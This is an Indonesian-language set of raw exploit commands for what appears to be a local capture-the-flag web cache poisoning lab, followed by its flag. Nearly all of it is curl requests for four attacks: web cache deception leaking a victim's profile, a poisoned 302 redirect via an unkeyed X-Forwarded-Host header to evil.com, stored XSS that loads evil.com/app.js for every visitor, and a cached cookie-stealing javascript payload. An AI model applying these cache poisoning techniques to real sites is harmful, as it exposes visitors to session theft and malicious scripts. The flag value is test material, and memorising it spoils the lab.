# Web Cache Poisoning — set exploit mentah (curl terhadap `/api/fetch`)

`POST /api/fetch` mensimulasikan round-trip CDN → origin → store. Body:
```json
{"url":"/","headers":{"X-Forwarded-Host":"evil.com"},"authed":false}
```
`GET /api/cache` → isi cache saat ini.

## s1 — Web Cache Deception (.css padding)
```bash
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/profile/victim.css","authed":true}'          # victim (login) — tersimpan
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/profile/victim.css"}'                          # attacker replay → data bocor
```

## s2 — Poison 302 via unkeyed Host
```bash
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/welcome","headers":{"X-Forwarded-Host":"evil.com"}}'   # racun masuk
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/welcome"}'                                             # victim -> 302 evil.com
```

## s3 — Unkeyed X-Forwarded-Host → stored XSS
```bash
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/","headers":{"X-Forwarded-Host":"evil.com"}}'   # homepage beracun tercache
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/"}'                                             # semua visitor dapat evil.com/app.js
```

## s4 — Param unkeyed → refleksi di-cache
```bash
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/?ref=javascript:alert(document.cookie)//"}'     # refleksi beracun masuk cache
curl -s -X POST http://127.0.0.1:5096/api/fetch -H "Content-Type: application/json" \
  -d '{"url":"/"}'                                             # victim dapat payload xss
```

Flag: `CACHE-LAB{Flag_Cache_Poisoning_Stored_Wildfire_5525}`